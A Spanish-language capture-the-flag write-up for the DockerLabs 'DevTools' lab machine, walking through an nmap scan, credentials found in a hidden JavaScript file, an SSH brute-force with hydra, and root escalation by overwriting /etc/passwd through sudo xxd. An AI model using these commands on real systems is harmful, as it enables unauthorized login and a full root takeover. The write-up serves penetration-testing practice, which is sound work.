Máquina "DevTools" de [DockerLabs](https://dockerlabs.es)

Autor: [El Pingüino de Mario](https://www.youtube.com/channel/UCGLfzfKRUsV6BzkrF1kJGsg)

Dificultad: Medio



![DevTools](./images/devtools/img/dockerlabs.png)



# Reconocimiento

Empezamos con un escaneo de `nmap`:

```css
nmap -sSVC -p- -Pn -n --open --min-rate 5000 -vvv 172.17.0.2 -oN escaneo.txt
```

```ruby
# Nmap 7.95 scan initiated Sun Dec 15 10:59:27 2024 as: nmap -sSVC -p- -Pn -n --open --min-rate 5000 -vvv -oN escaneo.txt 172.17.0.2
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000012s latency).
Scanned at 2024-12-15 10:59:27 -03 for 8s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 4d:ea:92:ba:53:e3:b8:dc:71:95:50:19:87:6b:b2:6d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHySp29oLAUPUU27byLQHAEweVlLXLNNoJgJaI/3JeRE+R+8K0xWa4pAawQpPvD2Xrpuf7MovEvk2DSIgp85zoY=
|   256 fa:77:68:76:dc:8e:b1:cd:56:5f:c1:79:89:ad:fa:78 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINOqd4h1jKYg1fOng1zCM8B/Z0aA4iM5Q7lEm6SW+n7p
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: \xC2\xBFQu\xC3\xA9 son las DevTools del Navegador?
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec 15 10:59:36 2024 -- 1 IP address (1 host up) scanned in 8.57 seconds
```

Solo tenemos dos puertos abiertos:

•`Puerto 22: OpenSSH 9.2p1`

•`Puerto 80: Apache httpd 2.4.62`

y nos enfrentamos a un `Debian`.

Si vamos a la web, nos saltará un cuadro que nos pide iniciar sesión, pero nosotros no tenemos la contraseña. Luego de probar un rato, decido leer el código fuente de la página (`curl 172.17.0.2`) y veo que dice lo siguiente en el principio:

```html
<script src="backupp.js" defer></script>
```

Viendo esto, puede ser que el archivo se intente ocultar ya que su nombre es "backup" pero con dos "p", por lo que si lo revisamos, veremos que nos da las credenciales:

![Credenciales](./images/devtools/img/credenciales.png)

si probamos las credenciales en la web nos funcionan correctamente, pero no para entrar por ssh, pero si revisamos el comentario:

```css
// Antigua contraseña beluleroh
```

(Supongo que mario quiso poner "baluleroh" (su perro) pero ahi en la maquina puso "beluleroh")

Por lo que podriamos intentar un ataque de `hydra` pero con usuarios.

# Intrusión

Continuamos haciendo el ataque:

```
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p baluleroh -V ssh://172.17.0.2 -t 64
```



![Carlos-pass](./images/devtools/img/hydra.png)

Ya tenemos credenciales, por lo que continuaremos conectándonos por ssh.

# Escalada de privilegios

### Carlos

Siendo el usuario carlos, ejecuto un `sudo -l` y veo que puedo ejecutar `ping` como root y `xxd`, por lo que luego de buscar, veo que puedo editar el `/etc/passwd` de la siguiente manera:

```css
echo root::0:0:root:/root:/bin/bash | sudo xxd | sudo xxd -r - "/etc/passwd"
```

Por lo que una vez ejecutado eso, ejecutamos `su` y escalamos a root.

## Root

![Root](./images/devtools/img/root.png)

Gracias por leer :)